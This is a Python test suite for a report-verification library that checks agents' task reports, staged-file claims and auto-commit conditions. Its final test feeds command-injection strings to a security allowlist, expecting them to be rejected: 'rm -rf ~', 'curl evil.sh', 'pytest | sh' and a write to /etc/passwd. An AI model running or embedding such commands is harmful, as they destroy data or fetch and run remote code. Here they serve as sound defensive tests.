"""
Bug-hunt tests for lib/report_verify.py — contract-driven, not behaviour-enshrining.

The oracle, in order: agents/executor.md's REPORT FORMAT (which this parser exists to enforce),
skills/verify/SKILL.md (the verdicts, the exit codes, the five auto-commit conditions), and
report_verify.py's own module/function docstrings. Where the code contradicts one of those, the
test sides with the CONTRACT and carries an `xfail(strict=True)` naming the finding in
tests/bughunt/lib-findings.md.

Run: pytest tests/test_lib_report_verify_bughunt.py -v
"""
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "lib"))
import report_verify as rv  # noqa: E402


def reality(staged=(), modified=(), untracked=(), repo_entries=(), commits_since=0, rerun=None):
    return {"staged": list(staged), "modified": list(modified), "untracked": list(untracked),
            "repo_entries": set(repo_entries), "commits_since": commits_since, "rerun": rerun}


def mismatched_paths(result):
    return [f["text"].split(" — ")[0] for f in result["findings"]
            if f["code"] == "claimed-not-staged"]


TLDR = """Status: clean
Risk flags: none
UNVERIFIED: none
Changed: one line
"""


def report(outcome="Did the thing; staged.", tldr=TLDR, body=""):
    return f"{outcome}\n\n{tldr}\n{body}"


# ── the REPORT FORMAT's TL;DR contract (agents/executor.md, "REQUIRED TL;DR block") ────────────
class TestTldrContractEdges:
    def test_first_line_being_a_tldr_field_is_malformed(self):
        """agents/executor.md: 'THE VERY FIRST LINE of the report must be ONE PLAIN SENTENCE
        stating the outcome' — a report that opens straight into the block has no outcome line."""
        t = rv.parse_tldr(TLDR)
        assert any("outcome sentence is missing" in p for p in t["problems"])

    def test_whitespace_only_report_is_empty_not_silently_fine(self):
        """'absence must read as malformed, not as "nothing to report"' (agents/executor.md)."""
        t = rv.parse_tldr("\n   \n\t\n")
        assert t["problems"] == ["report is empty"]
        assert t["outcome"] is None

    def test_tldr_block_far_below_the_outcome_line_is_malformed(self):
        """agents/executor.md: 'Immediately after that first line, a REQUIRED TL;DR block'.
        report_verify.TLDR_SCAN_LINES encodes that as a top-of-report window; a block pushed past
        it must read as MALFORMED (missing lines), never as well-formed."""
        filler = "\n".join(f"prose line {i}" for i in range(rv.TLDR_SCAN_LINES + 5))
        t = rv.parse_tldr(f"Did the thing; staged.\n\n{filler}\n\n{TLDR}")
        assert t["problems"], "a TL;DR block outside the scan window must not read as well-formed"
        assert all(f"missing mandatory TL;DR line `{p}`" in t["problems"]
                   for p, _ in rv.TLDR_FIELDS)

    def test_status_is_case_sensitive_and_an_odd_case_is_malformed(self):
        """STATUS_VALUES are the four lower-case words agents/executor.md lists verbatim
        ('clean / clean-with-caveats / blocked / partial'); anything else is a contract
        violation the parser must name."""
        t = rv.parse_tldr(report(tldr=TLDR.replace("Status: clean", "Status: Clean")))
        assert any("is not one of" in p for p in t["problems"])

    def test_a_malformed_status_case_can_never_clear_auto_commit(self):
        """skills/verify/SKILL.md: condition 1 is 'this command's verdict is COUNTS-MATCH'.
        clearance() lower-cases Status while parse_tldr does not, so the two disagree about
        'Clean' — condition 1 must still stop it, deterministically."""
        text = report(tldr=TLDR.replace("Status: clean", "Status: Clean"),
                      body="## What changed\n- src/app.py:1 — a line.\n\nStaged, not committed.\n")
        res = rv.verify(text, reality(staged=["src/app.py"], repo_entries={"src"}))
        clr = rv.clearance(res, in_plan=True, diff_reviewed=True)
        assert res["verdict"] == rv.MALFORMED
        assert clr["cleared"] is False
        assert clr["reason"] == "verdict-is-MALFORMED"

    def test_a_template_echo_above_the_real_block_cannot_falsely_clear(self):
        """AMBIGUOUS-lib-1: duplicated TL;DR fields are silently first-wins. This pins the half
        that MUST hold whatever is decided there — skills/verify/SKILL.md condition 2 requires
        'Status: clean', so a first-seen template line listing all four values must not clear."""
        text = ("Did the thing; staged.\n\n"
                "Status: clean / clean-with-caveats / blocked / partial\n"
                "Risk flags: <none if there are none>\n"
                "UNVERIFIED: <none if truly none>\n"
                "Changed: <one line>\n\n"
                "Status: clean\nRisk flags: none\nUNVERIFIED: none\nChanged: one line\n\n"
                "## What changed\n- src/app.py:1 — a line.\n\nStaged, not committed.\n")
        res = rv.verify(text, reality(staged=["src/app.py"], repo_entries={"src"}))
        clr = rv.clearance(res, in_plan=True, diff_reviewed=True)
        assert clr["cleared"] is False
        assert clr["reason"] == "status-not-clean"


# ── claimed files: the false-accusation class the module says is its expensive error ───────────
class TestClaimExtraction:
    def test_a_non_ascii_filename_is_not_falsely_accused(self):
        """plausible_claims' docstring (lib/report_verify.py:162-165): accusing an executor of not
        staging a path that isn't one 'would be a false MISMATCH — the expensive error here, since
        a false accusation costs more trust than a missed catch'. `tests/tëst_data.py` is staged
        and claimed, so the only correct outcome is zero mismatches."""
        text = report(body="## What changed\n- tests/tëst_data.py:1 — renamed the fixture.\n\n"
                           "Staged, not committed.\n")
        res = rv.verify(text, reality(staged=["tests/tëst_data.py"], repo_entries={"tests"}))
        assert mismatched_paths(res) == []
        assert res["verdict"] == rv.COUNTS_MATCH

    def test_a_claim_on_the_what_changed_bullet_itself_is_checked(self):
        """what_changed_section's docstring: 'Runs from the heading/bullet naming it to the next
        heading' — a bullet is an accepted opener, so a report that names its changed file on that
        same bullet must still have that file checked. Here the file is NOT staged, so the tool
        owes the lead a MISMATCH naming it (skills/verify/SKILL.md, 'Claimed vs staged files')."""
        text = report(body="- What changed: src/app.py:2 — appended a line.\n\n"
                           "Staged, not committed.\n")
        res = rv.verify(text, reality(staged=["src/other.py"], repo_entries={"src"}))
        assert "src/app.py" in mismatched_paths(res)

    def test_a_bulleted_section_does_not_swallow_the_rest_of_the_report(self):
        """The same docstring pair: the scoped path is 'trustworthy enough to accuse on', and
        plausible_claims exists so 'a false accusation costs more trust than a missed catch'.
        `lib/other.py` here is explicitly named as merely READ — accusing it is the expensive
        error, and a whole-report scan is supposed to downgrade to advisory instead."""
        text = report(body="- What changed: src/app.py:2 — appended a line.\n"
                           "- What I verified: ran the suite over tests/test_app.py, 5 passed.\n"
                           "- I also read lib/other.py to understand the format.\n\n"
                           "Staged, not committed.\n")
        res = rv.verify(text, reality(staged=["src/app.py"], repo_entries={"src", "lib", "tests"}))
        assert "lib/other.py" not in mismatched_paths(res)
        assert "tests/test_app.py" not in mismatched_paths(res)

    def test_home_and_absolute_paths_are_never_claimed(self):
        """plausible_claims: only repo-relative paths are claims. A packet/report path under the
        home dir or an absolute path must not become an accusation about the worktree index."""
        text = report(body="## What changed\n"
                           "- wrote the report to ~/.relay-tasks/bh/packets/001-report.md\n"
                           "- read /Users/someone/notes.md for context\n\n"
                           "Staged, not committed.\n")
        res = rv.verify(text, reality(staged=["src/app.py"], repo_entries={"src"}))
        assert mismatched_paths(res) == []

    def test_a_staged_deletion_counts_as_staged(self):
        """`git diff --cached --name-only` lists a staged DELETION by path, so a report claiming
        the file it deleted is telling the truth — SKILL.md only makes 'claimed but isn't staged'
        a MISMATCH."""
        text = report(body="## What changed\n- src/dead.py — deleted.\n\nStaged, not committed.\n")
        res = rv.verify(text, reality(staged=["src/dead.py"], repo_entries={"src"}))
        assert res["verdict"] == rv.COUNTS_MATCH
        assert res["claimed_staged"] == ["src/dead.py"]

    def test_a_file_both_staged_and_further_modified_is_not_a_mismatch(self):
        """SKILL.md makes only 'claimed but isn't staged' a MISMATCH; a claimed file that IS
        staged and also carries later worktree edits is still staged, so it must not be accused."""
        text = report(body="## What changed\n- src/app.py:2 — a line.\n\nStaged, not committed.\n")
        res = rv.verify(text, reality(staged=["src/app.py"], modified=["src/app.py"],
                                      repo_entries={"src"}))
        assert mismatched_paths(res) == []
        assert res["verdict"] == rv.COUNTS_MATCH

    def test_claims_over_an_empty_index_are_a_mismatch_even_without_the_staged_line(self):
        """SKILL.md: 'a report asserting its work is staged over an empty index is a hard
        contradiction'. The same holds when it names files but omits the confirmation line — the
        claim is still contradicted by an empty `git diff --cached`."""
        text = report(body="## What changed\n- src/app.py:2 — a line.\n")
        res = rv.verify(text, reality(staged=[], repo_entries={"src"}))
        assert res["verdict"] == rv.MISMATCH
        codes = [f["code"] for f in res["findings"] if f["level"] == "mismatch"]
        assert "index-empty" in codes
        assert any("`git diff --cached` is EMPTY" in f["text"] for f in res["findings"])

    def test_a_bullet_opener_s_nested_sub_bullets_are_the_section_body(self):
        """what_changed_section: a bullet opener's terminator must fire only on a bullet at the
        opener's own indent or shallower — never on a deeper, nested sub-bullet, which is the
        section's own body. Before the fix, the first indented sub-bullet ("  - lib/a.py")
        matched the same 0-3-space terminator regex as a sibling and ended the section
        immediately, so BOTH nested paths were silently dropped from what was checked."""
        text = ("- What changed:\n  - lib/a.py\n  - lib/b.py\n"
                "- What I verified: ran tests\n")
        section = rv.what_changed_section(text)
        assert section is not None
        paths, scoped = rv.claimed_paths(text)
        assert scoped
        assert "lib/a.py" in paths
        assert "lib/b.py" in paths

    def test_a_sibling_bullet_still_terminates_a_bulleted_section(self):
        """The companion contract to the nested case above: a bullet at the SAME indent as the
        opener (a true sibling, e.g. the next top-level '- What I verified:' bullet) must still
        end the section — only a deeper, nested bullet is section body."""
        text = ("- What changed:\n  - lib/a.py\n"
                "- What I verified: lib/should_not_be_claimed.py\n")
        paths, scoped = rv.claimed_paths(text)
        assert scoped
        assert "lib/a.py" in paths
        assert "lib/should_not_be_claimed.py" not in paths


# ── false positives observed LIVE, from `relay verify` runs on 2026-09-05 ─────────────────────
# The report bodies below are the real sentences those runs accused, kept verbatim.
REPO_ENTRIES = {"bin", "lib", "hooks", "tests", "skills", "docs", "agents", "scripts", "assets",
                "README.md", "VENDOR.md", "LICENSE", "PRIVACY.md"}


class TestLiveFalsePositives:
    def test_dotted_identifiers_in_prose_are_not_claims(self):
        """The bare-filename branch exists with an explicit stated defence
        (lib/report_verify.py:151-152): it 'caps the extension at 6 chars so a dotted Python
        identifier (`diff_render.parse_report_mentions`) doesn't read as a file'. That defence
        only holds for LONG attribute names — `.model`, `.get`, `.g` are all inside the cap — so
        the class it was written to exclude walks straight through. Live output:

            ✗ lead_guard.model — claimed under "What changed" but not staged …
            ✗ e.g — claimed …
            ✗ r.get — claimed …
            ✗ s.get — claimed …
        """
        text = report(body="## What changed\n"
                           "- bin/relay:120 — gate the ceiling (via "
                           "lead_guard.model_exceeds_ceiling); returns (ok, detail, info_lines)\n"
                           "- widened the table, e.g. haiku 200k, reading r.get(\"model\") and "
                           "s.get(\"model\")\n\nStaged, not committed.\n")
        res = rv.verify(text, reality(staged=["bin/relay"], repo_entries=REPO_ENTRIES))
        assert mismatched_paths(res) == []

    def test_a_bare_filename_that_is_not_in_the_repo_is_not_claimed(self):
        """plausible_claims promises to keep only 'ones that could really be repo files'
        (lib/report_verify.py:160-171), and a false accusation is named there as 'the expensive
        error here'. `tier_windows.json` lives under ~/.relay-tasks — it is not, and never was, a
        repo path — but the extension rule alone lets it through and MISMATCH names it.
        `README.md` in the same report must stay checkable: it IS a top-level repo entry."""
        text = report(body="## What changed\n"
                           "- the resolved windows are cached in tier_windows.json under the "
                           "state root\n- README.md:12 — documented it.\n\n"
                           "Staged, not committed.\n")
        res = rv.verify(text, reality(staged=["README.md"], repo_entries=REPO_ENTRIES))
        assert "tier_windows.json" not in mismatched_paths(res)
        assert res["claimed_staged"] == ["README.md"]

    def test_globs_and_bare_directories_never_become_claims(self):
        """The decidable half of AMBIGUOUS-lib-4. In the live sentence

            New files only — bin/relay, lib/*.py, hooks/*.py, skills/, README.md and every
            existing test file are untouched, per the shared boundaries.

        `bin/relay` and `README.md` WERE accused; whether the tool can or should read the negation
        is recorded as AMBIGUOUS-lib-4 and deliberately not asserted here. What IS settled is that
        a glob pattern and a bare directory name are not repo FILES and must never be claims —
        `plausible_claims` keeps only 'ones that could really be repo files'. This pins that half
        so a future negation/prose fix cannot silently regress it."""
        text = report(body="## What changed\n\n"
                           "New files only — bin/relay, lib/*.py, hooks/*.py, skills/, README.md "
                           "and every existing test\nfile are untouched, per the shared "
                           "boundaries.\n\n- tests/test_new.py:1-50 — the new tests.\n\n"
                           "Staged, not committed.\n")
        res = rv.verify(text, reality(staged=["tests/test_new.py"], repo_entries=REPO_ENTRIES))
        for ghost in ("lib/*.py", "hooks/*.py", "skills/", "skills", "lib", "hooks"):
            assert ghost not in res["claims"], ghost
        assert "tests/test_new.py" in res["claimed_staged"]


# ── the five auto-commit conditions (skills/verify/SKILL.md, "The auto-commit gate") ───────────
CLEAN_BODY = "## What changed\n- src/app.py:1 — a line.\n\nStaged, not committed.\n"


def clean_result(staged=("src/app.py",), tldr=TLDR):
    return rv.verify(report(tldr=tldr, body=CLEAN_BODY),
                     reality(staged=staged, repo_entries={"src", "hooks", "lib"}))


class TestClearanceDeterminism:
    @pytest.mark.parametrize("kwargs,expected_slug", [
        (dict(), "verdict-is-MISMATCH"),                       # condition 1
        (dict(tldr=TLDR.replace("clean", "clean-with-caveats")), "status-not-clean"),
        (dict(tldr=TLDR.replace("Risk flags: none", "Risk flags: weakened a test")),
         "risk-flags-present"),
        (dict(tldr=TLDR.replace("UNVERIFIED: none", "UNVERIFIED: the restart path")),
         "unverified-claims-present"),
    ])
    def test_each_failing_condition_names_itself(self, kwargs, expected_slug):
        """SKILL.md: it prints 'AUTO-COMMIT: NOT-CLEARED-BECAUSE-<reason>'; clearance()'s docstring
        says the reason is 'the FIRST failed condition in numeric order'. Each condition must
        therefore name ITSELF when it is the only one failing."""
        staged = ("src/app.py",) if kwargs else ("src/never-claimed.py",)
        clr = rv.clearance(clean_result(staged=staged, **kwargs), in_plan=True, diff_reviewed=True)
        assert clr["cleared"] is False
        assert clr["reason"] == expected_slug

    def test_condition_4_names_itself_when_it_is_the_only_failure(self):
        """SKILL.md condition 4: 'nothing sign-off-gated is touched (… for relay's own repo,
        hooks/, lib/lead_guard.py, ledger formats)'."""
        text = ("Did the thing; staged.\n\n" + TLDR +
                "\n## What changed\n- hooks/stop_lead_watch.py:1 — a line.\n\n"
                "Staged, not committed.\n")
        res = rv.verify(text, reality(staged=["hooks/stop_lead_watch.py"], repo_entries={"hooks"}))
        clr = rv.clearance(res, in_plan=True, diff_reviewed=True)
        assert clr["reason"] == "signoff-gated-path-touched"

    @pytest.mark.parametrize("in_plan,diff_reviewed,slug", [
        (False, True, "not-attested-in-plan"),
        (True, False, "not-attested-diff-reviewed"),
        (False, False, "not-attested-in-plan"),
    ])
    def test_the_two_attestations_are_required_flags_never_inferred(self, in_plan, diff_reviewed, slug):
        """SKILL.md: 'Conditions 3 and 5 are not machine-knowable, so they are your explicit
        attestations via --in-plan and --diff-reviewed. Without both, the answer is always
        NOT-CLEARED.' Numeric order also makes 3 outrank 5 when both are missing."""
        clr = rv.clearance(clean_result(), in_plan=in_plan, diff_reviewed=diff_reviewed)
        assert clr["cleared"] is False
        assert clr["reason"] == slug

    def test_every_condition_failing_still_reports_condition_1(self):
        """The headline must be stable: 'the FIRST failed condition in numeric order'
        (clearance docstring), whatever else is also wrong."""
        text = ("Did the thing; staged.\n\n"
                "Status: blocked\nRisk flags: a failing test\nUNVERIFIED: everything\n"
                "Changed: nothing\n\n## What changed\n- hooks/x.py:1 — a line.\n")
        res = rv.verify(text, reality(staged=[], repo_entries={"hooks"}))
        clr = rv.clearance(res, in_plan=False, diff_reviewed=False)
        assert [c["n"] for c in clr["conditions"] if not c["ok"]] == [1, 2, 3, 5]
        assert clr["reason"] == f"verdict-is-{res['verdict']}"

    def test_clearance_does_not_mutate_the_result_it_grades(self):
        """clearance() is documented 'Pure: the caller supplies the attestations, this never infers
        them' — a second grading of the same result must be identical."""
        res = clean_result()
        before = dict(res)
        first = rv.clearance(res, in_plan=True, diff_reviewed=True)
        second = rv.clearance(res, in_plan=True, diff_reviewed=True)
        assert res == before
        assert first == second
        assert first["cleared"] is True

    def test_conditions_3_and_5_are_flagged_as_uncheckable_and_1_2_4_as_checkable(self):
        """SKILL.md: 'Conditions 3 and 5 are not machine-knowable' — render_clearance leans on the
        `checkable` flag to print '[lead's attestation — this tool cannot check it]'."""
        clr = rv.clearance(clean_result(), in_plan=True, diff_reviewed=True)
        assert {c["n"]: c["checkable"] for c in clr["conditions"]} == {
            1: True, 2: True, 3: False, 4: True, 5: False}
        text = "\n".join(line for line, _ in rv.render_clearance(clr))
        assert text.count("[lead's attestation — this tool cannot check it]") == 2


# ── verdict / exit-code table (skills/verify/SKILL.md, "The verdicts") ─────────────────────────
class TestVerdictTable:
    @pytest.mark.parametrize("verdict,code", [
        (rv.COUNTS_MATCH, 0), (rv.MISMATCH, 1), (rv.MALFORMED, 2), (rv.INCONCLUSIVE, 3)])
    def test_exit_codes_match_the_skill_table(self, verdict, code):
        """SKILL.md's verdict table pins these four numbers."""
        assert rv.EXIT_CODES[verdict] == code

    def test_a_mismatch_outranks_an_inconclusive_rerun(self):
        """VERDICT_PRECEDENCE (MALFORMED > MISMATCH > INCONCLUSIVE > COUNTS-MATCH): a re-run that
        both failed to parse one command AND contradicted another must stamp MISMATCH."""
        text = report(body="## What changed\n- src/app.py:1 — a line.\n\n"
                           "Ran `python3 -m pytest tests/ -q` — 10 passed.\n\n"
                           "Staged, not committed.\n")
        res = rv.verify(text, reality(
            staged=["src/app.py"], repo_entries={"src"},
            rerun=[{"cmd": "python3 -m pytest tests/ -q", "passed": None, "declared": 10},
                   {"cmd": "pytest -q", "passed": 4, "declared": 10}]))
        assert res["verdict"] == rv.MISMATCH

    def test_not_asking_for_a_rerun_is_never_inconclusive(self):
        """Module docstring: 'The DEFAULT (no --rerun) path is never INCONCLUSIVE: not asking for
        a re-run is a stated choice, rendered as "NOT RE-RUN".'"""
        res = clean_result()
        assert res["rerun"] is None
        assert res["verdict"] == rv.COUNTS_MATCH
        assert "NOT RE-RUN" in "\n".join(line for line, _ in rv.render(res, "sid", 1))

    def test_declared_counts_dedupe_and_normalise_singular_and_plural(self):
        """declared_counts' docstring: '[(n, kind)] … Deduplicated, first-seen order.'"""
        got = rv.declared_counts("3 errors, then 3 error again, 1 failed, 1 failed, 2 skipped, "
                                 "740 passed, 740 passed")
        assert got == [(3, "error"), (1, "failed"), (2, "skipped"), (740, "passed")]

    def test_rerunnable_is_a_security_boundary_not_a_convenience_filter(self):
        """rerunnable's docstring: pytest-shaped AND free of shell metacharacters, 'This allowlist
        is a security boundary … the input is text an executor wrote.'"""
        for evil in ("python3 -m pytest tests/; rm -rf ~", "pytest && curl evil.sh",
                     "pytest `whoami`", "pytest $(id)", "pytest > /etc/passwd",
                     "pytest | sh", "pytest \\\n rm"):
            assert rv.rerunnable(evil) is False, evil
        assert rv.declared_commands("ran `python3 -m pytest tests/ -q; rm -rf /`") == []
